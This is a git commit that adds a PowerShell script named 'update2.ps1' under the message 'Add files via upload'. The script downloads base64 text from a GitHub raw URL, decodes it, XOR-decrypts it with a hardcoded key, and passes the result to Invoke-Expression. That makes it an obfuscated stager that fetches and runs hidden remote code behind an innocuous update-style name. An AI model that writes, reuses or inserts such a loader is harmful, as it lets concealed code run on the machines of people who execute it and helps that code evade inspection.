98bfa623db1966b83a4d794f34c5f00f87251497
ferris-b <131989689+ferris-b@users.noreply.github.com>
2023-04-27 19:29:57 +0000

    Add files via upload

---
+++ update2.ps1
@@ -0,0 +1,10 @@
+﻿$enc = [System.Text.Encoding]::UTF8
+$EncodedText = (wget https://raw.githubusercontent.com/ferris-b/chicago/main/fix.txt).content
+$test = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedText))
+$key = "zachzachzach"
+$bytes=([system.Text.Encoding]::UTF8.getBytes($test))
+$newBytes = @();
+for ($i = 0; $i -lt $bytes.Count; $i++) {
+    $newBytes += $bytes[$i] -bxor $key[$i % $key.Length];
+    }
+([system.Text.Encoding]::UTF8.getString($newBytes)) | iex
